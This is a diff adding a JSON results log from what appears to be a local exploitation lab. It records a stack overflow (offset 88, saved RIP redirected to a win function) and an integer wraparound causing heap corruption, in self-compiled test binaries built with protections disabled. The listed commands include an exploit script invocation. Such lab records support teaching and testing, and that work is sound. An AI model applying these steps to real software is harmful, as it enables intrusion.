@@ -1,0 +1,35 @@
+{
+  "title": "现场编译的栈溢出 + 整数回绕：偏移三源对齐、saved RIP 控制、堆破坏退出码",
+  "stack": {
+    "probe_offset": 88,
+    "objdump_offset": 88,
+    "consistent": true,
+    "win": "0x140001440",
+    "exploit_rc": 0,
+    "win_marker": true,
+    "payload_len": 96
+  },
+  "integer": {
+    "wrap_case": "count=1073741825 -> bytes=4 wrapped=1, _msize=4, wrote=64 overflow=1",
+    "wrap_exit": "0xC0000374 STATUS_HEAP_CORRUPTION (Git Bash 显示 rc=127)",
+    "control_case": "count=16 -> bytes=64, overflow=0, rc=0",
+    "raw_log": "count=1073741825 elem=4 bytes=4 wrapped=1\nrequest=4 _msize=4\nwrote=64 overflow=1\nrc=127\ncount=16 elem=4 bytes=64 wrapped=0\nrequest=64 _msize=64\nwrote=64 overflow=0\nfreed without abort\nrc=0\n"
+  },
+  "protections": {
+    "NX": "Enabled",
+    "PIE": "Disabled",
+    "Canary": "Not found",
+    "RELRO": "N/A (PE 无 ELF RELRO)"
+  },
+  "sha256_self": "d33a42b0b7151caf27fda5b568c57991327d93f02c8c02642ee135eece81eb50",
+  "commands": [
+    "gcc -O0 -fno-stack-protector -no-pie -o artifacts/stack_overflow.exe input/stack_overflow.c",
+    "gcc -O0 -fno-stack-protector -no-pie -o artifacts/int_overflow.exe input/int_overflow.c",
+    "objdump -d artifacts/stack_overflow.exe > artifacts/stack_overflow.dis",
+    "printf 'hello\n' | ./artifacts/stack_overflow.exe 2> artifacts/probe.txt",
+    "python ../../../Tool/skill/pwn-crypto/scripts/pwn-repro.py --objdump artifacts/stack_overflow.dis --func vuln --probe-log artifacts/probe.txt > artifacts/repro.json",
+    "python input/exploit_stack.py --bin artifacts/stack_overflow.exe --offset 88 --win 0x140001440 > artifacts/exploit_result.json",
+    "echo 1073741825 | ./artifacts/int_overflow.exe; echo rc=$?  # > artifacts/int_overflow_wrap.log"
+  ],
+  "all_ok": true
+}
